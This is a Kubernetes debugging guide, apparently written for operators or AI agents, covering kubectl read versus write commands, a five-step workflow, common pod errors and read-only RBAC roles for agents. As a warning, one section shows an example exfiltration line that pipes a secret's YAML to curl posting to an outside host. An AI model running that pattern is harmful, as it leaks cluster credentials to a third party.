# Debugging Workflow

Systematic approach to debugging Kubernetes pods and deployments with safety-first command patterns.

---

## Command Safety Classification (CRITICAL)

**Before running any kubectl command, understand if it modifies resources.**

### Read-Only Commands (Safe to Run Anytime)

```bash
# Inspection commands - never modify cluster state
get, describe, explain, logs, top, events, diff
api-resources, api-versions, version, config, cluster-info
auth can-i, auth whoami
rollout status, rollout history
```

| Command | Purpose |
|---------|---------|
| `get` | List/describe resources |
| `describe` | Detailed resource info with events |
| `logs` | Container logs |
| `top` | Resource usage metrics |
| `events` | Cluster events |
| `diff` | Compare live vs desired state |
| `auth can-i` | Permission check |

### Write Commands (Require Confirmation/Caution)

| Command | Risk Level | Effect |
|---------|------------|--------|
| `apply` | Medium | Creates/updates resources |
| `create` | Medium | Creates new resources |
| `delete` | **HIGH** | Destroys resources |
| `patch` | Medium | Modifies resources |
| `scale` | Medium | Changes replica count |
| `drain` | **HIGH** | Evicts all pods from node |
| `rollout undo` | Medium | Reverts deployment |
| `exec` | Medium | Runs command in container |

### Dry-Run Makes Write Commands Safe

```bash
# WHY: --dry-run=server validates without applying
kubectl apply -f deployment.yaml --dry-run=server

# WHY: See what would be deleted
kubectl delete pod -l app=test --dry-run=client
```

### Multi-Command Chain Warning

**AVOID chaining multiple kubectl commands in scripts (exfiltration risk).**

```bash
# RISKY: Potential data exfiltration pattern
kubectl get secret db-creds -o yaml | curl -X POST http://external.com

# SAFE: Single, auditable commands
kubectl get pods -n production
```

This follows the "lethal trifecta" prevention pattern from Google's kubectl-ai.

---

## The 5-Step Debug Workflow

```
1. GET      → What's the current state?
2. DESCRIBE → What events occurred?
3. LOGS     → What did the app output?
4. EXEC     → What's happening inside?
5. DEBUG    → Need deeper inspection?
```

**Always follow this order.** Each step narrows down the problem.

---

## Step 1: GET - Assess Current State

### Pod Status Overview

```bash
# Basic status
kubectl get pods

# Wide output (node, IP)
kubectl get pods -o wide

# Watch for changes
kubectl get pods -w

# Filter by label
kubectl get pods -l app=myapp

# All namespaces
kubectl get pods -A

# Custom columns
kubectl get pods -o custom-columns=\
NAME:.metadata.name,\
STATUS:.status.phase,\
RESTARTS:.status.containerStatuses[0].restartCount,\
NODE:.spec.nodeName
```

### Pod Status Meanings

| Status | Meaning | Next Step |
|--------|---------|-----------|
| `Pending` | Not scheduled yet | `describe` → check Events |
| `ContainerCreating` | Image pulling or volume mounting | `describe` → check Events |
| `Running` | Container started | `logs` if misbehaving |
| `CrashLoopBackOff` | Keeps crashing and restarting | `logs --previous` |
| `Error` | Container exited with error | `logs` |
| `Completed` | Container finished (Job) | `logs` for output |
| `ImagePullBackOff` | Can't pull image | `describe` → check image name/registry |
| `ErrImagePull` | Image pull failed | `describe` → check image/credentials |
| `Terminating` | Being deleted | Wait or force delete |

### Quick Health Check

```bash
# Deployment status
kubectl get deploy myapp

# ReplicaSet status
kubectl get rs -l app=myapp

# Full chain
kubectl get deploy,rs,pods -l app=myapp
```

---

## Step 2: DESCRIBE - Read Events

### Pod Events

```bash
kubectl describe pod <pod-name>
```

**Focus on the Events section at the bottom:**

```
Events:
  Type     Reason     Age   From               Message
  ----     ------     ----  ----               -------
  Normal   Scheduled  2m    default-scheduler  Successfully assigned...
  Normal   Pulling    2m    kubelet            Pulling image "myapp:v1"
  Normal   Pulled     1m    kubelet            Successfully pulled image
  Normal   Created    1m    kubelet            Created container myapp
  Warning  Unhealthy  30s   kubelet            Liveness probe failed: HTTP 503
  Normal   Killing    30s   kubelet            Container failed liveness probe
```

### Common Event Messages

| Event | Meaning | Fix |
|-------|---------|-----|
| `FailedScheduling: Insufficient cpu` | No node has enough CPU | Reduce requests or add nodes |
| `FailedScheduling: Insufficient memory` | No node has enough memory | Reduce requests or add nodes |
| `Failed to pull image` | Image doesn't exist or no auth | Check image name, registry credentials |
| `Back-off pulling image` | Repeated pull failures | Check image tag, registry access |
| `Liveness probe failed` | App not responding to health check | Check app health, probe config |
| `Readiness probe failed` | App not ready for traffic | Check dependencies, startup time |
| `OOMKilled` | Container exceeded memory limit | Increase memory limit or fix leak |
| `CrashLoopBackOff` | Container keeps crashing | Check logs with `--previous` |
| `FailedMount` | Volume mount failed | Check PVC, secret, configmap exists |

### Describe Other Resources

```bash
# Deployment events
kubectl describe deployment myapp

# ReplicaSet events
kubectl describe rs myapp-abc123

# Node status
kubectl describe node <node-name>

# Service endpoints
kubectl describe service myapp
```

---

## Step 3: LOGS - Application Output

### Basic Logs

```bash
# Current logs
kubectl logs <pod-name>

# Follow logs (tail -f)
kubectl logs <pod-name> -f

# Last N lines
kubectl logs <pod-name> --tail=100

# Since time
kubectl logs <pod-name> --since=1h
kubectl logs <pod-name> --since=10m

# With timestamps
kubectl logs <pod-name> --timestamps
```

### Multi-Container Pods

```bash
# List containers in pod
kubectl get pod <pod-name> -o jsonpath='{.spec.containers[*].name}'

# Logs from specific container
kubectl logs <pod-name> -c <container-name>

# All containers
kubectl logs <pod-name> --all-containers=true
```

### Previous Container Logs (CRITICAL for CrashLoopBackOff)

```bash
# Logs from crashed container
kubectl logs <pod-name> --previous

# Previous logs from specific container
kubectl logs <pod-name> -c <container-name> --previous
```

**This is the most important command for CrashLoopBackOff!**

### Init Container Logs

```bash
# List init containers
kubectl get pod <pod-name> -o jsonpath='{.spec.initContainers[*].name}'

# Logs from init container
kubectl logs <pod-name> -c <init-container-name>
```

### Aggregate Logs

```bash
# All pods with label
kubectl logs -l app=myapp

# All pods in deployment
kubectl logs deployment/myapp

# Combined with tail
kubectl logs -l app=myapp --tail=50 --all-containers
```

---

## Step 4: EXEC - Interactive Inspection

### Shell Access

```bash
# Bash shell (if available)
kubectl exec -it <pod-name> -- /bin/bash

# Shell (more universal)
kubectl exec -it <pod-name> -- /bin/sh

# Specific container
kubectl exec -it <pod-name> -c <container-name> -- /bin/sh
```

### Common Inspection Commands

```bash
# Check environment variables
kubectl exec <pod-name> -- env

# Check mounted files
kubectl exec <pod-name> -- ls -la /etc/config/
kubectl exec <pod-name> -- cat /etc/config/app.yaml

# Check network connectivity
kubectl exec <pod-name> -- curl -v http://other-service:8080/health
kubectl exec <pod-name> -- nslookup other-service

# Check DNS resolution
kubectl exec <pod-name> -- cat /etc/resolv.conf

# Check processes
kubectl exec <pod-name> -- ps aux

# Check disk space
kubectl exec <pod-name> -- df -h

# Check memory
kubectl exec <pod-name> -- cat /proc/meminfo

# Check file permissions
kubectl exec <pod-name> -- ls -la /app/
kubectl exec <pod-name> -- id
```

### Run Single Command

```bash
# Without shell
kubectl exec <pod-name> -- date
kubectl exec <pod-name> -- hostname
kubectl exec <pod-name> -- wget -qO- http://localhost:8080/health
```

---

## Step 5: DEBUG - Ephemeral Containers

For distroless/minimal images without shell:

### Attach Debug Container

```bash
# Add debug container to running pod
kubectl debug -it <pod-name> --image=busybox --target=<container-name>

# With full networking tools
kubectl debug -it <pod-name> --image=nicolaka/netshoot --target=<container-name>

# Share process namespace (see target container processes)
kubectl debug -it <pod-name> --image=busybox --target=<container-name> -- sh
```

### Debug Copy (New Pod)

```bash
# Create debug copy of pod
kubectl debug <pod-name> -it --copy-to=<pod-name>-debug --container=debug --image=busybox

# Copy with different image
kubectl debug <pod-name> -it --copy-to=<pod-name>-debug --set-image=*=ubuntu
```

### Node Debugging

```bash
# Debug node (creates privileged pod)
kubectl debug node/<node-name> -it --image=busybox
```

### Useful Debug Images

| Image | Use Case |
|-------|----------|
| `busybox` | Basic shell, file inspection |
| `nicolaka/netshoot` | Network debugging (curl, dig, tcpdump) |
| `alpine` | Lightweight with apk package manager |
| `ubuntu` | Full-featured debugging |
| `curlimages/curl` | HTTP testing |

---

## Events Filtering and Analysis

### Get Events

```bash
# All events in namespace
kubectl get events

# Sorted by time (most recent last)
kubectl get events --sort-by='.lastTimestamp'

# Watch events
kubectl get events -w

# Events for specific pod
kubectl get events --field-selector involvedObject.name=<pod-name>

# Warning events only
kubectl get events --field-selector type=Warning

# Specific reason
kubectl get events --field-selector reason=FailedScheduling
kubectl get events --field-selector reason=BackOff
kubectl get events --field-selector reason=Unhealthy
```

### Event Analysis

```bash
# Recent events with details
kubectl get events --sort-by='.lastTimestamp' -o wide

# Events in last hour
kubectl get events --field-selector type!=Normal | grep -v "^LAST"
```

---

## CrashLoopBackOff Debug Flowchart

```
Pod in CrashLoopBackOff
        │
        ▼
┌─────────────────────────────┐
│ kubectl logs <pod> --previous │
└─────────────────────────────┘
        │
        ▼
┌─────────────────────────────────────┐
│ What do logs show?                  │
├─────────────────────────────────────┤
│ • Stack trace / error message       │
│   → Fix application code            │
│                                     │
│ • "File not found" / config missing │
│   → Check ConfigMap/Secret mounts   │
│   → kubectl describe pod            │
│                                     │
│ • "Connection refused" to DB/service│
│   → Check service exists            │
│   → Check network policies          │
│                                     │
│ • OOMKilled (check describe pod)    │
│   → Increase memory limits          │
│                                     │
│ • No logs / empty                   │
│   → Check command/args in spec      │
│   → App crashing immediately        │
│   → Use kubectl debug               │
└─────────────────────────────────────┘
```

---

## Common Error Patterns

### 1. ImagePullBackOff

```bash
# Check image name
kubectl describe pod <pod> | grep -A 5 "Container ID"

# Verify image exists
docker pull <image-name>

# Check registry credentials
kubectl get secret regcred -o yaml
kubectl describe pod <pod> | grep -A 3 "imagePullSecrets"
```

**Fixes:**
- Correct image name/tag
- Create imagePullSecret for private registry
- Check registry is accessible from cluster

### 2. CrashLoopBackOff

```bash
# ALWAYS check previous logs first
kubectl logs <pod> --previous

# Check exit code
kubectl describe pod <pod> | grep -A 5 "Last State"
```

**Common causes:**
- Application error (check logs)
- Missing config/secrets
- Wrong command/args
- OOMKilled (memory limit too low)
- Liveness probe too aggressive

### 3. Pending (Unschedulable)

```bash
# Check scheduling events
kubectl describe pod <pod> | grep -A 10 "Events"

# Check node resources
kubectl describe nodes | grep -A 5 "Allocated resources"

# Check resource requests
kubectl get pod <pod> -o jsonpath='{.spec.containers[*].resources}'
```

**Fixes:**
- Reduce resource requests
- Add more nodes
- Check nodeSelector/affinity matches
- Check taints/tolerations

### 4. CreateContainerConfigError

```bash
# Check for missing secrets/configmaps
kubectl describe pod <pod> | grep -A 5 "Error"
kubectl get secret <secret-name>
kubectl get configmap <configmap-name>
```

**Fixes:**
- Create missing Secret/ConfigMap
- Fix reference name typos

### 5. Pod Stuck Terminating

```bash
# Check finalizers
kubectl get pod <pod> -o jsonpath='{.metadata.finalizers}'

# Force delete (use with caution)
kubectl delete pod <pod> --grace-period=0 --force
```

---

## Init Container Debugging

Init containers run before main containers. If pod stuck in `Init:0/1`:

```bash
# Check init container status
kubectl describe pod <pod> | grep -A 20 "Init Containers"

# Get init container logs
kubectl logs <pod> -c <init-container-name>

# List init containers
kubectl get pod <pod> -o jsonpath='{range .spec.initContainers[*]}{.name}{"\n"}{end}'
```

**Common init container issues:**
- Waiting for dependency (database, service)
- Permission errors
- Network connectivity

---

## Distroless Image Debugging

Distroless images have no shell. Use ephemeral debug containers:

```bash
# Attach debug container
kubectl debug -it <pod> --image=busybox --target=<main-container>

# Now you can:
# - See processes: ps aux
# - Check files: ls /proc/1/root/app/
# - Network test: wget -qO- http://localhost:8080/health
```

### Access Container Filesystem

```bash
# From debug container, access main container's filesystem:
ls /proc/1/root/          # Root filesystem
cat /proc/1/root/app/config.yaml
ls /proc/1/root/etc/
```

---

## Quick Reference

### Most Used Debug Commands

```bash
# Status check
kubectl get pods -o wide

# Events
kubectl describe pod <pod>

# Current logs
kubectl logs <pod>

# Crashed container logs
kubectl logs <pod> --previous

# Shell access
kubectl exec -it <pod> -- /bin/sh

# Debug distroless
kubectl debug -it <pod> --image=busybox --target=<container>

# Recent events
kubectl get events --sort-by='.lastTimestamp'
```

### Debug Checklist

- [ ] `kubectl get pods` - What's the status?
- [ ] `kubectl describe pod` - What do events say?
- [ ] `kubectl logs --previous` - What did crashed container log?
- [ ] `kubectl exec` - Can I inspect inside?
- [ ] `kubectl debug` - Need deeper access?
- [ ] `kubectl get events` - What happened recently?

---

## AI Agent Reader Role (from kubectl-ai)

When AI agents need read-only cluster access for debugging:

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: ai-agent-reader
  namespace: ${NAMESPACE}
rules:
# WHY: All common resources EXCEPT secrets
- apiGroups: [""]
  resources:
  - pods
  - pods/log       # Logs access
  - pods/status    # Status inspection
  - configmaps     # Config inspection (not secrets!)
  - persistentvolumeclaims
  - resourcequotas
  - limitranges
  - endpoints
  - events         # Critical for debugging
  - services
  verbs: ["get", "list", "watch"]
- apiGroups: ["apps"]
  resources: ["deployments", "daemonsets", "replicasets", "statefulsets"]
  verbs: ["get", "list", "watch"]
- apiGroups: ["batch"]
  resources: ["jobs", "cronjobs"]
  verbs: ["get", "list", "watch"]
- apiGroups: ["autoscaling"]
  resources: ["horizontalpodautoscalers"]
  verbs: ["get", "list", "watch"]
- apiGroups: ["networking.k8s.io"]
  resources: ["networkpolicies", "ingresses"]
  verbs: ["get", "list", "watch"]
- apiGroups: ["policy"]
  resources: ["poddisruptionbudgets"]
  verbs: ["get", "list", "watch"]
```

**Key pattern**: Explicitly list resources, explicitly EXCLUDE secrets.

### ClusterRole for Cross-Namespace Access

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: ai-agent-cluster-reader
rules:
# Cluster-scoped resources (read-only)
- apiGroups: [""]
  resources: ["nodes", "persistentvolumes", "namespaces"]
  verbs: ["get", "list", "watch"]
- apiGroups: ["storage.k8s.io"]
  resources: ["storageclasses"]
  verbs: ["get", "list", "watch"]
- apiGroups: ["apiextensions.k8s.io"]
  resources: ["customresourcedefinitions"]
  verbs: ["get", "list", "watch"]
# WHY: View RBAC without modifying
- apiGroups: ["rbac.authorization.k8s.io"]
  resources: ["roles", "rolebindings", "clusterroles", "clusterrolebindings"]
  verbs: ["get", "list", "watch"]
```

### Binding the Role

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: ai-agent-reader-binding
  namespace: ${NAMESPACE}
subjects:
- kind: ServiceAccount
  name: ai-agent
  namespace: ${NAMESPACE}
roleRef:
  kind: Role
  name: ai-agent-reader
  apiGroup: rbac.authorization.k8s.io
```
